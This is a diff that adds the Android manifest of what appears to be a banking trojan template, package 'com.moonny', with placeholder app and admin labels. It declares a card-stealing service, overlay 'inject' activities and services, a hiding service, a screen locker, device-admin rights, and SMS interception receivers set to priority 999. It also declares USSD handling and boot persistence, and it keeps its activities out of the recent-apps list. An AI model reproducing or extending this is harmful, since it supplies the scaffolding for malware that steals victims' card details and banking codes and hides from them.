@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.moonny"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:installLocation="internalOnly">
+
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- <uses-permission android:name="android.permission.GET_TASKS" /> -->
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.USES_POLICY_FORCE_LOCK" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <application
+        android:allowBackup="false"
+        android:icon="@drawable/ic_launcher181"
+        android:label="%APP_NAME%"
+        android:excludeFromRecents="true"
+        android:theme="@style/TransparentTheme">
+
+        <!-- activities -->
+        <activity
+            android:name="com.moonny.acts.MainActivity"
+            android:label="%APP_NAME%"
+            android:noHistory="true"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name="com.moonny.acts.AdminActivity"
+            android:excludeFromRecents="true"
+            android:screenOrientation="portrait" />
+        <activity
+            android:name="com.moonny.acts.CC1"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true"
+            android:theme="@style/DialogStyle" />
+        <activity
+            android:name="com.moonny.acts.CC2"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true"
+            android:theme="@style/DialogStyle" />
+        <!-- Custom inject size: android:theme="@style/DialogStyle" -->
+        <activity
+            android:name="com.moonny.acts.InjectActivity"
+            android:screenOrientation="portrait"
+            android:theme="@android:style/Theme.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:windowSoftInputMode="adjustResize" />
+        <activity
+            android:name="com.moonny.acts.Screenlock"
+            android:screenOrientation="portrait"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.NoTitleBar.Fullscreen" />
+
+        <!-- receivers -->
+        <receiver
+            android:name="com.moonny.rcvs.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.moonny.rcvs.AdminRightsReceiver"
+            android:label="%DEVICE_ADMIN_LABEL%"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/admin_perms" />
+
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+        <receiver
+            android:name="com.moonny.rcvs.AlarmReceiver"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="MainActivity.AlarmAction" />
+            </intent-filter>
+        </receiver>
+
+        <!-- services -->
+        <service
+            android:name="com.moonny.srvs.USSDService"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="com.android.ussd.IExtendedNetworkService" />
+            </intent-filter>
+        </service>
+
+		<service android:name="com.moonny.srvs.HideService" />
+        <service android:name="com.moonny.srvs.InjectsService" />
+        <service android:name="com.moonny.srvs.CCStealerService" />
+        <service android:name="com.moonny.srvs.AdminRightsService" />
+
+        <receiver android:name=".rcvs.SmsRcv" >
+            <intent-filter android:priority="999" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- mod:sms_admin AUTO TAG, DO NOT REMOVE-->
+        <receiver android:name=".sms.MmsReceiver"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".sms.PushServiceReceiver"
+            android:permission="android.permission.BROADCAST_WAP_PUSH">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+                <data android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+        <!-- Activity that allows the user to send new SMS/MMS messages -->
+        <activity android:name=".sms.SendSms" >
+            <intent-filter>
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SENDTO" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </activity>
+        <!-- Service that delivers messages from the phone "quick response" -->
+        <service android:name=".sms.HeadlessSmsSendService"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+        <!-- end_mod:sms_admin AUTO TAG, DO NOT REMOVE -->
+
+
+
+    </application>
+</manifest>
